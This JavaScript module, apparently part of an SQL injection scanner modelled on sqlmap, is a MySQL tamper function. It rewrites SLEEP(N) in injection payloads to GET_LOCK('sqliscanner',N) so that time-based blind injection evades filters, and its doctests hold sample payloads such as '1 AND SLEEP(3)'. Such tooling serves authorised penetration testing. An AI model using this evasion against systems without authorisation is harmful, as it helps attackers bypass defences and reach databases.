// 对标 sqlmap sleep2getlock.py（MySQL 专用）：
// SLEEP(N) 改写为 GET_LOCK(alias, N)——获取同名锁竞争阻塞等价延时，
// 绕过对 SLEEP 函数的过滤（时间盲注等价改写）
export const sleep2getlock = {
  name: 'sleep2getlock',
  description: '将 SLEEP(N) 改写为 GET_LOCK(alias,N) 等价延时（MySQL 时间盲注绕过）',
  doctests: [
    { input: 'SLEEP(5)', output: "GET_LOCK('sqliscanner',5)" },
    { input: '1 AND SLEEP(3)', output: "1 AND GET_LOCK('sqliscanner',3)" },
    { input: '1 AND 1=1', output: '1 AND 1=1' },
  ],
  dbms: ['MySQL'], // [P1-FIX] 方言限定：异构库下无效，运行时告警
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    // alias 固定为项目名（官方为随机会话别名；固定值保证 doctest 确定性）
    return String(payload ?? '').replace(/\bSLEEP\(/gi, "GET_LOCK('sqliscanner',");
  },
};
export default sleep2getlock;
